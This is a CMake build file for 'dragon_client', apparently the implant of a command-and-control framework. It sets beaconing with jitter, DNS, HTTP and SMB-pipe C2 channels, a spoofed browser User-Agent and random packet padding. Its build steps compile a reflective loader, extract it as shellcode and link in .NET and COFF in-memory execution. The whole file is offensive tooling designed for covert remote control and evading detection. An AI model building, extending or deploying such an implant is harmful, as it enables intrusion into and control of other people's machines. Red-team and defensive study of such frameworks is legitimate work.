cmake_minimum_required(VERSION 3.20)
project(dragon_client C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

set(CLIENT_LEVEL "1" CACHE STRING "Client level")
set(SERVER_IP "127.0.0.1" CACHE STRING "Server IP")
set(SERVER_PORT "8080" CACHE STRING "Server port")
set(FATHER_IP "0.0.0.0" CACHE STRING "Father IP")
set(FATHER_PORT "0" CACHE STRING "Father port")
set(UPSTREAM_TRANSPORT "tcp" CACHE STRING "Transport type")
set(BEACON_INTERVAL "20" CACHE STRING "Beacon interval in seconds")
set(DNS_DOMAIN "" CACHE STRING "DNS C2 domain (e.g. c2.example.com)")
set(DNS_POLL_MS "3000" CACHE STRING "DNS polling interval in ms")
set(JITTER_PCT "20" CACHE STRING "Beacon jitter percentage (0-50)")
set(RECONNECT_DELAY_MS "5000" CACHE STRING "Reconnect delay in ms")
set(HTTP_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" CACHE STRING "HTTP User-Agent")
set(HTTP_CONTENT_TYPE "application/octet-stream" CACHE STRING "HTTP Content-Type")
set(HTTP_PATH_DATA "/c2" CACHE STRING "HTTP data path")
set(HTTP_PATH_HS "/c2/hs" CACHE STRING "HTTP handshake path")
set(HTTP_EXTRA_HEADERS "" CACHE STRING "Extra HTTP headers (separated by \\r\\n)")
set(SMB_PIPE_NAME "dragon_pipe" CACHE STRING "SMB named pipe")
set(PKT_PAD_MIN "64" CACHE STRING "Minimum packet padding bytes")
set(PKT_PAD_MAX "512" CACHE STRING "Maximum packet padding bytes")

set(DEPS_DIR "${CMAKE_SOURCE_DIR}/../deps/mingw64" CACHE PATH "MinGW deps")

configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/client_config.h.in
    ${CMAKE_CURRENT_BINARY_DIR}/client_config.h
    @ONLY
)

add_custom_command(
    OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_sc.o
    COMMAND ${CMAKE_C_COMPILER} -c -O1
            -fno-stack-protector -ffunction-sections
            -fno-asynchronous-unwind-tables
            -I${CMAKE_CURRENT_SOURCE_DIR}
            ${CMAKE_CURRENT_SOURCE_DIR}/reflective_loader.c
            -o ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_sc.o
    DEPENDS reflective_loader.c reflective_loader.h
    COMMENT "Compiling reflective loader (PIC)"
)

add_custom_command(
    OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader.bin
    COMMAND x86_64-w64-mingw32-objcopy -O binary -j .text
            ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_sc.o
            ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader.bin
    DEPENDS ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_sc.o
    COMMENT "Extracting .text shellcode"
)

add_custom_command(
    OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_shellcode.h
    COMMAND xxd -i reflective_loader.bin > reflective_loader_shellcode.h
    WORKING_DIRECTORY ${CMAKE_CURRENT_BINARY_DIR}
    DEPENDS ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader.bin
    COMMENT "Generating shellcode header"
)

add_custom_target(shellcode_gen
    DEPENDS ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_shellcode.h
)

add_executable(client
    client.c
    dotnet_exec.c
    coff_loader.c
    crypto_dragon.c
    transport.c
    transport_tcp.c
    transport_http.c
    transport_https.c
    transport_smb.c
    transport_dns.c
)

add_dependencies(client shellcode_gen)

target_link_libraries(client PRIVATE
    ${CMAKE_CURRENT_BINARY_DIR}/reflective_loader_sc.o
)

target_include_directories(client PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_SOURCE_DIR}/..
    ${DEPS_DIR}/include
)

target_link_directories(client PRIVATE
    ${DEPS_DIR}/lib
    ${DEPS_DIR}/lib64
)

target_compile_options(client PRIVATE
    -O2 -s
    -fstack-protector-all
    -D_FORTIFY_SOURCE=2
)

target_link_options(client PRIVATE -static)

target_link_libraries(client PRIVATE
    sodium ssl crypto
    winhttp ws2_32 iphlpapi
    crypt32 bcrypt ncrypt secur32
    ole32 oleaut32 gdi32
)